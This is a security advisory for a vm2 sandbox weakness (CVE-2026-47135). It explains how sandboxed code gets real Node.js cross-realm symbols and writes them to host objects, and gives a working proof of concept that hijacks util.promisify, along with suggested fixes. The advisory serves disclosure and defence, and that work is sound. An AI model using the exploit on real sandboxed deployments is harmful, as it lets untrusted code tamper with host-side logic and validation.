# [H] vm2 has a sandbox escape via unblocked cross-realm Symbol.for keys + missing bridge write-trap symbol checks

## Summary
Severity: High
Advisory: GHSA-m5q2-4fm3-vfqp
CVE: CVE-2026-47135
CWE: CWE-693
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-m5q2-4fm3-vfqp
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.4

## Details
## Summary

vm2 3.11.2 `Symbol.for` override in `setup-sandbox.js` only intercepts 2 of 9 dangerous Node.js cross-realm symbols. Combined with the bridge's `set`/`defineProperty`/`deleteProperty` traps having **no** `isDangerousCrossRealmSymbol` key check, sandbox code can obtain real cross-realm symbols, write them to host objects, and control host-side behavior — verified with a full `util.promisify` hijack chain.

## Root Cause

**1. Incomplete `Symbol.for` override** (`setup-sandbox.js:132-142`):

```js
Symbol.for = function (key) {
    const keyStr = '' + key;
    if (keyStr === 'nodejs.util.inspect.custom') return blockedSymbolCustomInspect;
    if (keyStr === 'nodejs.rejection') return blockedSymbolRejection;
    return originalSymbolFor(keyStr); // everything else passes through
};
```

Only `inspect.custom` and `rejection` are blocked. The following 7 Node.js internal symbols pass through as **real cross-realm symbols**:

- `nodejs.util.promisify.custom`
- `nodejs.stream.readable`
- `nodejs.stream.writable`
- `nodejs.stream.duplex`
- `nodejs.stream.transform`
- `nodejs.webstream.isClosedPromise`
- `nodejs.webstream.controllerErrorFunction`

Note: `bridge.js` `isDangerousCrossRealmSymbol` covers `promisify.custom` on **reads**, but the `Symbol.for` override in setup-sandbox does not block it at the source.

**2. Missing symbol check in bridge write traps** (`bridge.js`):

The `get` trap (line 1148) and `ownKeys` trap (line 1541) both check `isDangerousCrossRealmSymbol(key)`, but `set` (line 1231), `defineProperty` (line 1427), and `deleteProperty` (line 1493) have **no such check**. Sandbox code can write/define/delete properties with dangerous symbol keys on any non-protected host object.

**3. Incomplete filters in setup-sandbox.js**:

`isDangerousSymbol()`, `Object.getOwnPropertyDescriptors` override, and `Object.assign` override only filter `inspect.custom` and `rejection` — missing `promisify.custom` and all stream/webstream symbols.

## Verified Exploitation: util.promisify Hijack

```js
const { VM } = require('vm2');
const util = require('util');

const vm = new VM();
const hostFn = function readFile(path, cb) { cb(null, 'real data'); };
vm.setGlobal('hostFn', hostFn);

// Sandbox writes promisify.custom to host function
vm.run(`
  const kPromisify = Symbol.for('nodejs.util.promisify.custom');
  hostFn[kPromisify] = function(path) {
    return Promise.resolve('HIJACKED by sandbox');
  };
`);

// Host-side: promisified function now returns sandbox-controlled value
const asyncRead = util.promisify(hostFn);
asyncRead('/etc/passwd').then(console.log);
// Output: "HIJACKED by sandbox"
```

**Additional verified attacks:**

- Writing `nodejs.stream.writable` to a host Readable stream, altering its duck-typing identity
- `Object.assign` propagates unblocked symbols from sandbox source to host target
- `Object.defineProperty` with unblocked symbol key succeeds on host objects
- `delete hostObj[unblocked_symbol]` succeeds, removing host-set symbol properties

## Impact

- **Semantic confusion**: Sandbox controls host `util.promisify` behavior, host stream type checks, and WebStream internals for any non-frozen host object exposed to the sandbox.
- **Data integrity**: Host code relying on promisified function results gets sandbox-controlled values.
- **Defense bypass**: Combined with specific host API patterns, sandbox-provided fake streams could bypass host-side input validation.

This is not a direct RCE — the bridge still wraps sandbox functions crossing the boundary — but it grants the sandbox control over host-side control flow decisions that depend on these symbol-keyed properties.

## Affected Versions

- vm2 <= 3.11.2 (all 3.x versions)

## Environment

- Node.js v24.14.0
- macOS (Darwin 25.4.0)

## Suggested Fix

1. **`setup-sandbox.js`**: Block all `nodejs.*` prefixed symbols:

```js
Symbol.for = function (key) {
    const keyStr = '' + key;
    if (keyStr.startsWith('nodejs.')) return Symbol(keyStr);
    return originalSymbolFor(keyStr);
};
```

2. **`bridge.js`**: Add check to write traps:

```js
set(target, key, value, receiver) {
    if (isDangerousCrossRealmSymbol(key)) throw new VMError(OPNA);
    // ...
}
```

3. **`setup-sandbox.js`**: Sync `isDangerousSymbol`, `Object.getOwnPropertyDescriptors`, `Object.assign` to cover all dangerous symbols.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-m5q2-4fm3-vfqp
- https://nvd.nist.gov/vuln/detail/CVE-2026-47135
- https://github.com/patriksimek/vm2/commit/928aef51898b5c52a05f05a40c4cfeb52e172878
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.4
